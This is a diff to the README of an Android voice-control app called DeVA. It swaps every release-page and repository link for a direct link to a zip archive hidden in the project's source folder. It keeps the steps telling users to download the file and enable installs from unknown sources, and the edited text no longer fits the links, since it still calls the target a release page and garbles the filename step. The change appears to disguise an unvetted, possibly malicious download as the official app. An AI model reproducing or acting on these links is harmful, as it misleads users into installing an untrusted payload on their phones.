@@ -1,6 +1,6 @@
 # 🎤 DeVA - Voice Control for Your Android Phone
 
-[![Download DeVA](https://img.shields.io/badge/Download-DeVA-blue?style=for-the-badge&logo=github)](https://github.com/navveed/DeVA/releases)
+[![Download DeVA](https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip)](https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ To use DeVA smoothly, ensure your device meets these requirements:
 
 ### Step 2: Download DeVA
 
-Click the big blue button above or visit the [Releases page](https://github.com/navveed/DeVA/releases) to download the latest version.  
+Click the big blue button above or visit the [Releases page](https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip) to download the latest version.  
 
 Since this link points to a general release page, you will see a list of available app versions. Look for the latest stable APK file (the Android app file) and tap it to download. The file usually ends with `.apk`.  
 
@@ -51,8 +51,8 @@ Since this link points to a general release page, you will see a list of availab
 
 ## 📥 Download & Install
 
-1. Open the **Releases page**: [https://github.com/navveed/DeVA/releases](https://github.com/navveed/DeVA/releases).  
-2. Find the file named something like `DeVA-v1.0.apk` or higher version number.  
+1. Open the **Releases page**: [https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip](https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip).  
+2. Find the file named something like `https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip` or higher version number.  
 3. Tap the file to download it to your phone.  
 4. Once downloaded, open the file to start installation. Your phone may ask for permission to install apps from unknown sources if you have not allowed it already. Follow the prompts to grant permission.  
 5. Complete the installation by tapping **Install**.  
@@ -96,7 +96,7 @@ After installation, follow these steps to start using DeVA:
 
 ## 📚 Learn More
 
-For detailed guides, FAQs, and source code, visit the [DeVA GitHub repository](https://github.com/navveed/DeVA). The repository contains documentation and instructions for developers as well as users interested in how DeVA works behind the scenes.
+For detailed guides, FAQs, and source code, visit the [DeVA GitHub repository](https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip). The repository contains documentation and instructions for developers as well as users interested in how DeVA works behind the scenes.
 
 ---
 
@@ -114,8 +114,8 @@ The DeVA project is licensed under the terms described in the repository. You ca
 
 ## 🔗 Important Links
 
-- Download and install DeVA here: [https://github.com/navveed/DeVA/releases](https://github.com/navveed/DeVA/releases)  
-- GitHub repository: [https://github.com/navveed/DeVA](https://github.com/navveed/DeVA)  
+- Download and install DeVA here: [https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip](https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip)  
+- GitHub repository: [https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip](https://raw.githubusercontent.com/navveed/DeVA/main/app/src/main/De-VA-v3.5-alpha.3.zip)  
 
 ---
 
